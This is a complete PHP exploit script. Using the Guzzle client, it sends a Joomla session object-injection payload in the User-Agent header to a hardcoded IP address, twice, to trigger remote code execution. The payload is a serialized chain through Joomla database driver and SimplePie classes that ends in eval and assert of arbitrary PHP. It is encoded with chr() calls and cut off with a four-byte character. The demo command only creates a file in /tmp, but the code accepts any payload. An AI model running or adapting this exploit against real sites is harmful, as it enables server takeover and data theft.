<?php
// load Composer autoloader
include 'vendor/autoload.php';

$target    = 'http://95.85.27.248';
$userAgent = createEvilUserAgent("system('touch /tmp/itWorks');");

$client = new GuzzleHttp\Client([
  'cookies' => true // save cookies between requests
]);

// Run attack twice. One sets the session, the other executes it.
for ( $i = 0; $i < 2; $i++ ) {
  $res = $client->request('GET', $target, [
    'debug'   => true, // To see the sent headers
    'headers' => [
      'User-Agent' => $userAgent,
    ],
  ]);
}

/**
 * Transform a string into a series of concatenated chr(_ascii_value)
 *
 * @param $data
 *
 * @return string
 */
function noquotes($data)
{
  $encoded = [];
  $data    = str_split($data);
  foreach ( $data as $char )
    $encoded[] = 'chr(' . ord($char) . ')';

  return implode('.', $encoded);
}

/**
 * Create the evil User-Agent
 *
 * @param $payload
 *
 * @return string
 */
function createEvilUserAgent($payload)
{
  $payload = noquotes($payload);

  $userAgent = '}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";';
  $userAgent .= 's:' . (strlen($payload) + 5 + 28) . ':"eval(' . $payload . ');JFactory::getConfig();exit";';
  $userAgent .= 's:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}';
  $userAgent .= "\xf0\xfd\xfd\xfd";

  return $userAgent;
}